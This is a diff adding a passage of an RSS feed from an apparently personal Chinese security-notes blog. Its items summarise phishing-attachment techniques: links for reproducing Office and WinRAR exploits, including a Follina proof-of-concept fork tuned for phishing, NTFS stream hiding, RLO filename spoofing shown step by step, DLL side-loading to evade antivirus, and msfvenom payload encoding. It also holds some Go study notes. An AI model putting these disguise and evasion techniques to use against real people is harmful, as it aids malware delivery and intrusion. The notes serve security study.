+<li><a href="https://www.google.com/search?q=CVE-2018-4993+%E5%A4%8D%E7%8E%B0&amp;sca_esv=04924ece6d4cc8bb&amp;sxsrf=ADLYWIK6kPpI8GAhxlla-dTnvMDeWvzoEQ%3A1719542433307&amp;source=hp&amp;ei=oSJ-ZvzoELO9vr0Pvqeh8QY&amp;iflsig=AL9hbdgAAAAAZn4wscmLxg7zjLXNyOq3q2dE8AYmy6oT&amp;ved=0ahUKEwi8vaXfov2GAxWznq8BHb5TKG4Q4dUDCBY&amp;uact=5&amp;oq=CVE-2018-4993+%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egdnd3Mtd2l6IhRDVkUtMjAxOC00OTkzIOWkjeeOsDIIEAAYgAQYogRI1QJQAFgAcAB4AJABAJgBb6ABb6oBAzAuMbgBA8gBAPgBAvgBAZgCAaACc5gDAJIHAzAuMaAHdQ&amp;sclient=gws-wiz" target="_blank" rel="noopener noreferrer">CVE-2018-4993 复现 - Google Search</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2018-8420</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-8420.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-8420.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2018-8420</source>
+      <description>CVE-2018-8420
+
+CVE-2018-8420复现 - Google Search
+钓鱼第二章：关于Cve-2018-8420系列利用-腾讯云开发者社区-腾讯云 (tencent.com)</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://www.google.com/search?q=CVE-2018-8420%E5%A4%8D%E7%8E%B0&amp;sca_esv=5ab8962a38650a00&amp;sxsrf=ADLYWILEeWhOfIyN-xDXW5JaLhBfKTI2Qw%3A1720063400553&amp;ei=qBWGZuS0IYip5NoPm9mS-A4&amp;ved=0ahUKEwjkqOy_t4yHAxWIFFkFHZusBO8Q4dUDCA8&amp;uact=5&amp;oq=CVE-2018-8420%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiE0NWRS0yMDE4LTg0MjDlpI3njrBIyQ9QgAtY6A1wAngAkAEAmAHLAqABlgWqAQMzLTK4AQPIAQD4AQGYAgCgAgCYAwCIBgGSBwCgB-EC&amp;sclient=gws-wiz-serp" target="_blank" rel="noopener noreferrer">CVE-2018-8420复现 - Google Search</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1420559" target="_blank" rel="noopener noreferrer">钓鱼第二章：关于Cve-2018-8420系列利用-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2022-30190</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2022-30190.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2022-30190.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2022-30190</source>
+      <description>CVE-2022-30190
+
+GitHub - chvancooten/follina.py: POC to replicate the full &amp;apos;Follina&amp;apos; Office RCE vulnerability for testing purposes
+GitHub - komomon/CVE-2022-30190-follina-Office...</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://github.com/chvancooten/follina.py" target="_blank" rel="noopener noreferrer">GitHub - chvancooten/follina.py: POC to replicate the full 'Follina' Office RCE vulnerability for testing purposes</a></li>
+<li><a href="https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed" target="_blank" rel="noopener noreferrer">GitHub - komomon/CVE-2022-30190-follina-Office-MSDT-Fixed: CVE-2022-30190-follina.py-修改版，可以自定义word模板，方便实战中钓鱼使用。</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2023-38831-WinRAR代码执行漏洞</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2023-38831-WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2023-38831-WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2023-38831-WinRAR代码执行漏洞</source>
+      <description>CVE-2023-38831-WinRAR代码执行漏洞
+
+CVE-2023-38831复现 - Google Search
+运营视角下钓鱼邮件的处理和预防 - 先知社区 (aliyun.com)
+【漏洞复现】CVE-2023-38831 WinRAR代码执行漏洞-腾讯云开发者社区-腾讯云 (tencent.com)</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://www.google.com/search?q=CVE-2023-38831%E5%A4%8D%E7%8E%B0&amp;sca_esv=b805c9cdf219ff53&amp;sxsrf=ADLYWIKbnBVTF_asaWmEeo6rvPiXJkjshw%3A1719545978771&amp;source=hp&amp;ei=ejB-Zvf1LIDb2roPpOip-AU&amp;iflsig=AL9hbdgAAAAAZn4-im4Dj-iJ4UZ7mmqMr5hVHMGEAJ_Y&amp;ved=0ahUKEwj3mvP5r_2GAxWArVYBHSR0Cl8Q4dUDCBY&amp;uact=5&amp;oq=CVE-2023-38831%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egdnd3Mtd2l6IhRDVkUtMjAyMy0zODgzMeWkjeeOsDIIEAAYgAQYogRI-DVQtwZY0zRwAngAkAEAmAHTAaAB-RSqAQYwLjE5LjG4AQPIAQD4AQGYAhCgAr8OqAIKwgIHECMYJxjqAsICBBAjGCfCAgsQABiABBiRAhiKBcICCBAAGIAEGLEDwgIOEC4YgAQYsQMY0QMYxwHCAhEQLhiABBixAxjRAxiDARjHAcICBRAAGIAEwgIIEAAYgAQYywHCAgQQABgewgIGEAAYCBgewgILEAAYgAQYhgMYigXCAggQABiiBBiJBZgDEpIHBDIuMTSgB-ld&amp;sclient=gws-wiz" target="_blank" rel="noopener noreferrer">CVE-2023-38831复现 - Google Search</a></li>
+<li><a href="https://xz.aliyun.com/t/13629?time__1311=mqmxnQ0QiQKWuD05DIB4Cu8BzDCQTD9GoD&amp;alichlgref=https%3A%2F%2Fgithub.com%2Ftib36%2FPhishingBook%3Ftab%3Dreadme-ov-file&amp;u_atoken=60275799dc149827eaef4a6b011bee5b&amp;u_asession=01R28BuWQXMdhPMIFtVgkpbb1-Hx9saPkkAPSGg9eI8hqgWhAsghWkWvWO5-JcoACEJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&amp;u_asig=05Tagv33N1eVxEZeJYX48ZEHmPMOs5IK9PCcaNBGFqkkRuJPx7HObllYzT4f2eu5nYcdfbnE2O_t8er_rr_3-X3o1RVnqSOyHvd9kZsSxwyztLDKPTGj2avRp_Z1wyQ3-jKkOcRpydyGHjgninyBVjm5CNyD6nwBQYStehbH4l5G7BzhvSc0Kr8URjOX9Xe4tk6xi3vAtY4Ou9eoSjTzkbMKOztEkzQriawUOUNGNcc2UM8vt29NjhDY4wsnqcPQps1v4tcYsWSqirxxYNUs4bVeklRuAm0XwjxMW0M8d20Zl6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&amp;u_aref=zc8fgiGWqcLpbGsvd93EaYXGVBM%3D" target="_blank" rel="noopener noreferrer">运营视角下钓鱼邮件的处理和预防 - 先知社区 (aliyun.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/2324062" target="_blank" rel="noopener noreferrer">【漏洞复现】CVE-2023-38831 WinRAR代码执行漏洞-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>NTFS文件流隐藏的可执行文件</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/NTFS%E6%96%87%E4%BB%B6%E6%B5%81%E9%9A%90%E8%97%8F%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/NTFS%E6%96%87%E4%BB%B6%E6%B5%81%E9%9A%90%E8%97%8F%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">NTFS文件流隐藏的可执行文件</source>
+      <description>NTFS文件流隐藏的可执行文件
+
+利用NTFS交换数据流隐藏文件_ntfs ads separator in file-CSDN博客
+
+NTFS备用数据流（Alternate Data Streams, ADS）: NTFS文件系统的一种特性，允许文件包含多个数据流。每个文件默认有一个主要数据流，用于存储文件的主要内容，但它也可以附加一个或多个备用数据...</description>
+      <pubDate>Wed, 17 Jul 2024 08:44:38 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://blog.csdn.net/Hexuefu_Bayonet/article/details/107237309" target="_blank" rel="noopener noreferrer">利用NTFS交换数据流隐藏文件_ntfs ads separator in file-CSDN博客</a></p>
+</blockquote>
+<p><code>NTFS备用数据流（Alternate Data Streams, ADS）</code>: NTFS文件系统的一种特性，允许文件包含多个数据流。每个文件默认有一个主要数据流，用于存储文件的主要内容，但它也可以附加一个或多个备用数据流。</p>
+<p>这些备用数据流不影响文件的主要内容或文件大小的显示，通常在传统的文件操作中也是隐藏的。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>文件名混淆</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%96%87%E4%BB%B6%E5%90%8D%E6%B7%B7%E6%B7%86.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%96%87%E4%BB%B6%E5%90%8D%E6%B7%B7%E6%B7%86.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">文件名混淆</source>
+      <description>文件名混淆
+RLO
+
+特洛伊代码 - YYGQ site (srayu.ws)
+
+RLO(Right-to-Left Override）是一种用于改变文本显示方向的特殊控制字符
+在Unicode标准中，RLO的字符代码是U+202E。其主要作用是将后续文本的显示方向从默认的左到右（LTR）改为从右到左（RTL）
+RLO可以用于例如阿拉伯语和希伯来语等本...</description>
+      <pubDate>Wed, 17 Jul 2024 08:44:38 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>RLO</h2>
+<blockquote>
+<p><a href="https://yygq.srayu.ws/post/trojansource/" target="_blank" rel="noopener noreferrer">特洛伊代码 - YYGQ site (srayu.ws)</a></p>
+</blockquote>
+<p>RLO(Right-to-Left Override）是一种用于改变文本显示方向的特殊控制字符</p>
+<p>在Unicode标准中，RLO的字符代码是U+202E。其主要作用是将后续文本的显示方向从默认的左到右（LTR）改为从右到左（RTL）</p>
+<p>RLO可以用于例如阿拉伯语和希伯来语等本身是从右到左书写的语言的显示</p>
+<p>这个显示效果会一直持续到接下来的一个换行符（或者是一些其他更复杂的规则，譬如 <a href="https://codepoints.net/U+202C" target="_blank" rel="noopener noreferrer">U+202C PDF</a>）</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406051131187.png" alt="image-20240605113053649"></p>
+<p>例如要把上面这个 <code>msedge.exe</code> 显示上看起来像是个 PDF 文件, 可以先改成 <code>msedgefdp.exe</code></p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406051134342.png" alt="image-20240605113402020"></p>
+<p>然后在 <code>f</code> 前插入 <code>RLO</code></p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406051135781.png" alt="image-20240605113525917"></p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406051348121.png" alt="image-20240605113547878"></p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406051131187.png" type="image/png"/>
+    </item>
+    <item>
+      <title>白加黑</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E7%99%BD%E5%8A%A0%E9%BB%91.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E7%99%BD%E5%8A%A0%E9%BB%91.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">白加黑</source>
+      <description>白加黑
+
+白加黑的初步探究 - 先知社区 (aliyun.com)
+GitHub - Neo-Maoku/SearchAvailableExe: 寻找可利用的白文件
+白加黑免杀制作（详细）-腾讯云开发者社区-腾讯云 (tencent.com)
+
+利用合法的、无害的（白）的程序或文件和恶意的（黑）的代码相结合，以绕过防病毒软件和其他安全措施的检测
+
+实例...</description>
+      <pubDate>Wed, 17 Jul 2024 08:44:38 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/12376?time__1311=mqmhD57KAImG7DlxGo%2FDyGTH4GKqn%2BD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener noreferrer">白加黑的初步探究 - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://github.com/Neo-Maoku/SearchAvailableExe" target="_blank" rel="noopener noreferrer">GitHub - Neo-Maoku/SearchAvailableExe: 寻找可利用的白文件</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2360981" target="_blank" rel="noopener noreferrer">白加黑免杀制作（详细）-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+<p>利用合法的、无害的（白）的程序或文件和恶意的（黑）的代码相结合，以绕过防病毒软件和其他安全措施的检测</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406051628800.png" type="image/png"/>
+    </item>
+    <item>
+      <title>捆绑程序</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">捆绑程序</source>
+      <description>捆绑程序
+
+
+捆绑程序
+
+利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序
+
+相关链接
+
+
+NSIS捆绑程序
+OpenArk捆绑程序
+
+制作步骤
+
+
+msfvenom捆绑程序
+cpp实现捆绑程序
+
+threadProc
+main
+
+从资源中提取 .docx 文件
+打开 .docx 文件
+实现自删除
+
+
+
+
+
+
+
+
+利用Winrar创建SF...</description>
+      <pubDate>Wed, 17 Jul 2024 08:44:20 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/image-20240429162640096.png" type="image/png"/>
+    </item>
+    <item>
+      <title>MSFConsole</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/MSFConsole.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/MSFConsole.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">MSFConsole</source>
+      <description>MSFConsole
+msfconsole 是 Metasploit 框架的主要命令行界面，用于加载、配置和运行漏洞利用模块。它提供了一个交互式环境，允许用户使用各种 Metasploit 功能，如：
+
+搜索和加载漏洞利用模块。
+配置和运行漏洞利用。
+管理会话和生成报告。
+与目标系统进行交互。</description>
+      <pubDate>Wed, 17 Jul 2024 08:35:11 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p><code>msfconsole</code> 是 Metasploit 框架的主要命令行界面，用于加载、配置和运行漏洞利用模块。它提供了一个交互式环境，允许用户使用各种 Metasploit 功能，如：</p>
+<ul>
+<li>搜索和加载漏洞利用模块。</li>
+<li>配置和运行漏洞利用。</li>
+<li>管理会话和生成报告。</li>
+<li>与目标系统进行交互。</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>msfvenom</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/MSFVenom.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/MSFVenom.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">msfvenom</source>
+      <description>msfvenom
+msfvenom 是 Metasploit 框架中的一个工具，用于生成各种 payloads，并对这些 payloads 进行编码和格式化。它整合了以前的 msfpayload 和 msfencode 工具，简化了 payload 的创建过程。msfvenom 主要功能包括：
+
+生成不同类型的 payloads，如反向 shell、绑...</description>
+      <pubDate>Wed, 17 Jul 2024 08:35:11 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p><code>msfvenom</code> 是 Metasploit 框架中的一个工具，用于生成各种 payloads，并对这些 payloads 进行编码和格式化。它整合了以前的 <code>msfpayload</code> 和 <code>msfencode</code> 工具，简化了 payload 的创建过程。<code>msfvenom</code> 主要功能包括：</p>
+<ul>
+<li>生成不同类型的 payloads，如反向 shell、绑定 shell、Meterpreter 等。</li>
+<li>对 payloads 进行编码，以规避防病毒软件的检测。</li>
+<li>将 payloads 格式化为多种输出格式，如可执行文件、shellcode、脚本等。</li>
+<li>嵌入 payloads 到现有的文件中。</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>MSF(Metasploit Framework)</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">MSF(Metasploit Framework)</source>
+      <description>MSF(Metasploit Framework)
+
+Metasploit | Penetration Testing Software, Pen Testing Security | Metasploit
+
+Metasploit 框架是一个用于开发和执行安全漏洞利用的工具包。它包含了大量的漏洞利用模块、payloads、编码器以及其他辅助工具，广泛应...</description>
+      <pubDate>Wed, 17 Jul 2024 08:35:11 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit | Penetration Testing Software, Pen Testing Security | Metasploit</a></p>
+</blockquote>
+<p>Metasploit 框架是一个用于开发和执行安全漏洞利用的工具包。它包含了大量的漏洞利用模块、payloads、编码器以及其他辅助工具，广泛应用于渗透测试和信息安全研究。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>VBScript</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/VBScript/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/VBScript/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">VBScript</source>
+      <description>VBScript
+
+概念
+
+VBScript - 维基百科，自由的百科全书 (wikipedia.org)
+
+VBScript（Microsoft Visual Basic Scripting Edition）是微软以 Visual Basic 为蓝本开发的一种已废弃的动态脚本语言。它允许 Microsoft Windows 系统管理员生成用于管理计算...</description>
+      <pubDate>Thu, 11 Jul 2024 11:18:22 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407121701650.png" type="image/png"/>
+    </item>
+    <item>
+      <title>SLK</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/SLK/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/SLK/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">SLK</source>
+      <description>SLK
+概述
+
+如何在没有 Excel 的情况下打开 SLK 文件 (filext.com)
+
+安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)
+
+SLK 文件大多属于 Microsoft 的 Excel。 SLK 文件是符号链接文件，它是由 Microsoft 开发并主要由 Excel 使用的格式。该文件格式仅使用可显示的 ANSI...</description>
+      <pubDate>Thu, 11 Jul 2024 11:16:50 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>概述</h2>
+<blockquote>
+<p><a href="https://filext.com/zh/wenjian-kuozhan-ming/SLK" target="_blank" rel="noopener noreferrer">如何在没有 Excel 的情况下打开 SLK 文件 (filext.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407081539970.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH11.测试</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH11-%E6%B5%8B%E8%AF%95.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH11-%E6%B5%8B%E8%AF%95.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH11.测试</source>
+      <description>CH11.测试
+
+
+CH11.测试
+
+CH11.1.go test
+CH11.2.测试函数
+
+EX11.1.为4.3节中的charcount程序编写测试。
+CH11.2.1.随机测试
+
+EX11.4.修改randomPalindrome函数
+
+
+CH11.2.2.测试一个命令
+CH11.2.3.白盒测试
+CH11.2.4.外部测试包
+CH11.2.5....</description>
+      <pubDate>Tue, 09 Jul 2024 17:13:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/image-20240709143615192.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH10.包和工具</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH10-%E5%8C%85%E5%92%8C%E5%B7%A5%E5%85%B7.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH10-%E5%8C%85%E5%92%8C%E5%B7%A5%E5%85%B7.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH10.包和工具</source>
+      <description>CH10.包和工具
+
+包和工具 - Go语言圣经 (golang-china.github.io)
+
+这一章的内容比较通识,没有什么需要特别关注的地方, 文档看起来不会特别卡在哪里
+
+Go语言中的包用于组织和复用代码，工具用于管理、编译、运行和测试Go项目
+
+包
+
+一个包是一个Go源文件的集合，这些文件共同实现了一些功能。
+每个Go文件都必须声明属于某...</description>
+      <pubDate>Tue, 02 Jul 2024 08:15:19 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://golang-china.github.io/gopl-zh/ch10/ch10.html" target="_blank" rel="noopener noreferrer">包和工具 - Go语言圣经 (golang-china.github.io)</a></p>
+</blockquote>
+<p>这一章的内容比较通识,没有什么需要特别关注的地方, 文档看起来不会特别卡在哪里</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202211222139359.png" type="image/png"/>
+    </item>
+    <item>
+      <title>蓝队</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%93%9D%E9%98%9F/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%93%9D%E9%98%9F/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">蓝队</source>
+      <description>蓝队</description>
+      <pubDate>Fri, 28 Jun 2024 09:11:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>命令执行</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/%E5%9C%BA%E6%99%AF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/%E5%9C%BA%E6%99%AF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">命令执行</source>
+      <description>命令执行
+
+Go命令执行 - Google Search
+Go 语言入门很简单：Go 语言执行Shell命令-云社区-华为云 (huaweicloud.com)
+Go中调用外部命令的几种姿势 - 大俊的博客 (darjun.github.io)
+go语言中执行命令的几种方式 - 序语程言 (yangyanxing.com)
+go os/exec 简明教...</description>
+      <pubDate>Fri, 28 Jun 2024 09:11:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://www.google.com/search?q=Go%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;sca_esv=661b256b13fc34d5&amp;sxsrf=ADLYWILxKhmwqCX_aQz5qUL8LT4EvulJXg%3A1719458262306&amp;source=hp&amp;ei=1tl8Zq_pEIqo2roPirGAiA4&amp;iflsig=AL9hbdgAAAAAZnzn5jQpJPBYU5MbQBguaA2eaQBPeKH1&amp;ved=0ahUKEwivrLeX6fqGAxUKlFYBHYoYAOEQ4dUDCBY&amp;uact=5&amp;oq=Go%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;gs_lp=Egdnd3Mtd2l6Ig5Hb-WRveS7pOaJp-ihjEiRP1C3AVjJPXAFeACQAQKYAZMCoAG3L6oBBjAuMzMuNrgBA8gBAPgBAvgBAZgCHKAChyCoAgrCAgcQIxgnGOoCwgIKEAAYgAQYQxiKBcICCxAAGIAEGLEDGIMBwgIFEC4YgATCAgUQABiABMICCxAuGIAEGNEDGMcBwgIEECMYJ8ICChAjGIAEGCcYigXCAgsQABiABBiRAhiKBcICERAuGIAEGLEDGNEDGIMBGMcBwgIIEC4YgAQYsQPCAhYQLhiABBixAxjRAxhDGIMBGMcBGIoFwgIQEAAYgAQYsQMYQxiDARiKBcICDRAuGIAEGMcBGAoYrwHCAgcQABiABBgKwgIKEC4YgAQYQxiKBcICChAuGIAEGLEDGArCAgoQLhiABBjUAhgKwgINEC4YgAQYsQMY1AIYCsICBxAuGIAEGArCAggQABiABBjLAcICCxAuGIAEGMcBGK8BwgIIEC4YgAQY1ALCAg0QABiABBixAxiDARgKwgITEC4YgAQYsQMY0QMYgwEYxwEYCsICCBAAGIAEGKIEmAMLkgcGNC4yMC40oAe2ywE&amp;sclient=gws-wiz" target="_blank" rel="noopener 